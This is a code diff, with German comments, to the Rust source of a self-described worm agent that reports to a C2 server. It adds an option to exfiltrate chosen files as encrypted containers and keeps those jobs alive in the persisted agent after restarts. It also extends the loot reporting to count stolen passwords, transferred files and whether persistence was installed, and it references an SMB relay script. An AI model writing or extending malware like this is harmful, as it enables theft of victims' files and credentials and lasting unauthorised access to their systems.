@@ -10,6 +10,7 @@
 //! gehört dort hin, nicht in eine Funktion hier.
 
 mod c2;
+mod datei;
 mod hostkey;
 mod lauf;
 mod meldung;
@@ -100,6 +101,13 @@ struct Args {
     /// unverschluesselt an den C2.
     #[arg(long)]
     server_key: Option<String>,
+    /// Dateien, die als KXENC-Container exfiltriert werden (Issue #31).
+    ///
+    /// Je Datei entsteht ein Container **neben** dem Original
+    /// (`<name>.kxenc`); das Original bleibt unangetastet. Braucht
+    /// `--server-key` — ohne Master-Key geht keine Datei raus.
+    #[arg(long = "exfil-file")]
+    exfil_file: Vec<PathBuf>,
 }
 
 impl Args {
@@ -152,6 +160,12 @@ impl Args {
         if let Some(schluessel) = &self.server_key {
             args.push("--server-key".to_string());
             args.push(schluessel.clone());
+        }
+        // Die Datei-Auftraege ueberleben den Neustart — sonst exfiltriert
+        // der persistierte Agent nur noch Passwoerter.
+        for pfad in &self.exfil_file {
+            args.push("--exfil-file".to_string());
+            args.push(pfad.to_string_lossy().to_string());
         }
         // Der Pfad wird fest eingetragen, damit der persistierte Agent das
         // Asset unabhängig vom Arbeitsverzeichnis findet.
@@ -218,11 +232,20 @@ async fn main() {
     // Die Zusammenfassung nennt die zugestellte Beute, nicht die vorbereitete.
     info!(
         "Agent-Lauf abgeschlossen: {} Hosts registriert, {} Beute uebertragen, \
-         {} Beute verloren, {} nicht extrahierbar",
+         {} Beute verloren, {} nicht extrahierbar, {} Task-Ergebnisse verloren, \
+         {} Dateien uebertragen, {} Dateien verloren, Persistenz {}",
         ergebnis.hosts_registriert,
         ergebnis.beute_uebertragen,
         ergebnis.beute_verloren,
-        ergebnis.beute_nicht_extrahiert
+        ergebnis.beute_nicht_extrahiert,
+        ergebnis.tasks_verloren,
+        ergebnis.dateien_uebertragen,
+        ergebnis.dateien_verloren,
+        if ergebnis.persistenz_fehlgeschlagen {
+            "fehlgeschlagen"
+        } else {
+            "installiert"
+        }
     );
 
     // Ein Lauf, der nichts erreicht, darf nicht als Erfolg melden. Der
@@ -231,9 +254,12 @@ async fn main() {
     // merkt der Betreiber erst beim Blick ins Dashboard, dass der Wurm
     // längst tot ist.
     //
-    // Zwei Faelle zaehlen als Fehlschlag: der C2-Server war nicht erreichbar,
-    // oder Beute ging verloren, die der Agent erfolgreich erbeutet hatte. Ein
-    // gescheiterter Exploit ist keiner — nichts gefunden ist ein Ergebnis.
+    // Sechs Faelle zaehlen als Fehlschlag: der C2-Server war nicht erreichbar,
+    // Beute ging verloren, die der Agent erfolgreich erbeutet hatte, eine
+    // Quelle war nicht extrahierbar (Issue #71), ein Task-Ergebnis erreichte
+    // den Operator nicht, eine Datei kam nicht an (Issue #31), oder die
+    // Persistenz liess sich nicht installieren (Issue #69). Ein gescheiterter
+    // Exploit ist keiner — nichts gefunden ist ein Ergebnis.
     if ergebnis.fehlgeschlagen() {
         let grund = if ergebnis.kein_host_angekommen() {
             "Der Lauf hat keinen Host angemeldet bekommen"
@@ -242,8 +268,15 @@ async fn main() {
         };
         error!(
             "{grund} — der Agent meldet Fehlschlag \
-             ({} Hosts verloren, {} Beute verloren)",
-            ergebnis.hosts_verloren, ergebnis.beute_verloren
+             ({} Hosts verloren, {} Beute verloren, {} nicht extrahierbar, \
+             {} Task-Ergebnisse verloren, {} Dateien verloren, \
+             Persistenz fehlgeschlagen: {})",
+            ergebnis.hosts_verloren,
+            ergebnis.beute_verloren,
+            ergebnis.beute_nicht_extrahiert,
+            ergebnis.tasks_verloren,
+            ergebnis.dateien_verloren,
+            ergebnis.persistenz_fehlgeschlagen
         );
         std::process::exit(1);
     }
@@ -265,6 +298,7 @@ mod tests {
             relay_script: "assets/smbrelayx.py".into(),
             server_cert: "/tmp/kx-server.crt".into(),
             server_key: None,
+            exfil_file: Vec::new(),
         }
     }
 
